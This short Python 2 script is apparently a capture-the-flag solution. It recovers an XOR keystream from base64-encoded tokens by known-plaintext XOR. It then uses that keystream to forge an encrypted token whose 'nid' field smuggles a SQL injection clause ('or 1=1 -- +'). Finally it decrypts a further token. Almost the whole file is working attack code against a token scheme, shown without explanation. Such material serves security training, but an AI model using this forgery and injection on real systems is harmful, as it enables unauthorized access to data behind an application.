# -*- coding:utf-8 -*-
import base64


def xor(str1, str2):
    return ''.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(str1, str2)])

s1 = "p9wpRtHrhrdv9BjnxETcfqGWjazMrr-88Nq-42gsRzaYSixjaoHNWInu7zK8e2lPG1UZ0oqZ0ROHBjwk-pz0WLd3JFsh3HLsgiqxaj5ZZgZ8sUNe7xDgjGxR2cuMgLc4DY9cI1lfxxv2Q0N0_wX2DFdroPrzWu4lkaB9W5QUUn2hQtXYwowV9rRdxAtY7A=="

print xor(base64.urlsafe_b64decode(s1), 'z' * 111).encode('hex')
# {"ownername": ""}

s2 = "p9wpRtHrhrdv9BjnxETcY7yLkLHRs6Kh7cej_nUxWiuFVzF-d5zQRZTz8i-hZnRSBkgEz5eEzA6aGyE554HpRapqOUY8wW_xnzesdyNEexthrF5D8g39kXFMxNaRnaolEJJBPkRC2gbrXl5p4hjrEUp2vefuR_M4jL1gRokJUn2hQtXYwowV9rRdxAtZ7A=="

print xor(base64.urlsafe_b64decode(s2), '{"ownername": "' + 'g' * 111).encode('hex')

# dcfe4631bf8ef4d90e997dc5fe64fe04dbecf7d6b6d4c5c68aa0c49912563d4ce230561910fbb722f3949548c6011335612f63a8f0e3ab69fd7c465e80e68e22cd0d5e215ba60896f850cb1044231c7c06cb3924956a9af6162ba3b1f6facd4277f526592325bd618c39390e857f8c

key = "dcfe4631bf8ef4d90e997dc5fe64fe04dbecf7d6b6d4c5c68aa0c49912563d4ce230561910fbb722f3949548c6011335612f63a8f0e3ab69fd7c465e80e68e22cd0d5e215ba60896f850cb1044231c7c06cb3924956a9af6162ba3b1f6facd4277f526592325bd618c39390e857f8c"
payload = '{"ownername": "1234", "nid": "2448\' or 1=1 -- +"}'
print base64.urlsafe_b64encode(xor(payload, key.decode('hex')))

print xor(base64.urlsafe_b64decode("p9wpRtHrhrdv9BjnxETcZ7-OmLjZo6uj-oLouTA4VCjACnYoIMiGE44="), key.decode('hex'))
# {"ownername": "cdbonownep", "nid": 10311}
